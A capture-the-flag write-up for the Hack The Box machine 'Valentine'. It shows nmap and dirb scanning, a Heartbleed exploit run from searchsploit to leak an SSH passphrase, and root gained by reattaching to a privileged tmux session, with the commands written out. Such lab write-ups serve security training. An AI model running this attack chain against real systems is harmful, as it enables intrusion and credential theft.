# Valentine
[![Valentine](https://www.hackthebox.eu/storage/avatars/61b3b6a4382f58a804e221062ced0bfb.png)](https://www.hackthebox.eu/home/machines/profile/127)

## Initial Foothold
From nmap we get ports 80, 22 and 443.
```sh
$ nmap -A -v 10.10.10.79
```
Then we run ***dirb*** on port 80.
```sh
$ dirb http://10.10.10.79
```
From dirb we get ***/dev*** directory in which there is ***hype_key.txt***. The content is encoded hex text, which we decode in plain text. After removing space using sed command, we get ssh key. Now we need to find the passphrase. Then we check if the HTTPS web service (ssl) is vulnerable to heartbleed with help of nmap script.
```sh
$  nmap –p 443 --script ssl-heartbleed 10.10.10.79
State: VULNERABLE
Risk factor: High
```
The service is vulnerable to heartbleed.
```sh
$ searchsploit heartbleed
exploits/multiple/remote/32764.py
```
Now lets exploit it.
```sh
$ python 32764.py 10.10.10.79
```
As we can see there is a buffer overflow. After some efforts we get a string in base64.
```sh
$ echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 –d
```
After getting the string in plain text, we are able to connect via ssh and use it as passphrase.
```sh
$ ssh –i key hype@10.10.10.79
$ cat /home/hype/Desktop/user.txt
```
We got user.

## Privesc
If we take a look in bash history, there is tmux session with root privileges. Lets open it again and take the root flag.
```sh
$ tmux –S /.devs/dev_sess
$ cat /root/root.txt
```
We got root!

[![bertolis](https://www.hackthebox.eu/badge/image/27897)](https://www.hackthebox.eu/home/users/profile/27897)  [![Valentine](https://www.hackthebox.eu/images/logofull-tr-web.png)](https://www.hackthebox.eu/)
